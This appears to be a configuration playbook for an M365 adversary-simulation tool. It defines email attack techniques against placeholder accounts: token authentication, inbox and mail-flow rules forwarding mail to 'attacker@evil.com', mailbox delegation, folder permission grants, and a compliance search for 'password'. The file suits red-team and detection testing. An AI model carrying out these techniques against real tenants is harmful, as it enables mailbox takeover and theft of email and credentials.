
authentication:
  tenant_id: "00000000-0000-0000-0000-000000000000"

playbooks:
  - name: "M365 Adversary Simmulation"
    description: "Techniques that manipulate email settings."

    techniques:

      # --- Authentication ---------------------------------------------------
      # Each auth step produces a token artifact other steps consume by
      # reference. A step that needs a different audience (e.g. the Exchange
      # REST API) has one minted from the artifact's refresh token on demand.

      - technique: "password_auth"
        enabled: False
        output: victim1
        parameters:
          username: "victim1@contoso.onmicrosoft.com"
          password: "SuperPass!!!"
          scope: "https://graph.microsoft.com/.default"

      - technique: "device_code_auth"
        enabled: False
        output: victim2
        parameters:
          username: "victim2@contoso.onmicrosoft.com"
          scope: "https://graph.microsoft.com/.default"

      # --- Techniques -----------------------------------------------------

      - technique: "read_email"
        enabled: False
        parameters:
          access_token: ${victim1.access_token}
          access_method: "graph"
          mailbox: "victim1@contoso.onmicrosoft.com"
          limit : 5

      - technique: "create_rule"
        enabled: False
        parameters:
          access_token: ${victim1.access_token}
          access_method: "graph"
          mailbox: "victim1@contoso.onmicrosoft.com"
          rule_name : "msinvader rule 33"
          forward_to : "attacker@evil.com"
          body_contains : "invoice"

      - technique: "enable_email_forwarding"
        enabled: False
        parameters:
          access_token: ${victim1.access_token}
          access_method: "rest"
          mailbox: "victim1@contoso.onmicrosoft.com"
          forward_to : "attacker@evil.com"

      - technique: "add_folder_permission"
        enabled: False
        parameters:
          access_token: ${victim2.access_token}
          access_method: "rest"
          mailbox: "victim2@contoso.onmicrosoft.com"
          folder: "Inbox"
          grantee : "Default"
          access_rights : "Owner"

      - technique: "add_mailbox_delegation"
        enabled: False
        parameters:
          access_token: ${victim2.access_token}
          access_method: "rest"
          mailbox: "attacker@contoso.onmicrosoft.com"
          access_rights : "FullAccess"

      - technique: "run_compliance_search"
        enabled: False
        parameters:
          access_token: ${victim2.access_token}
          access_method: "rest"
          keyword : "password"
          name : "msInvader 365 compliance search"

      - technique: "create_mailflow_rule"
        enabled: False
        parameters:
          access_token: ${victim2.access_token}
          access_method: "rest"
          forward_to : "attacker@evil.com"
          name : "msInvader mailflow rule"
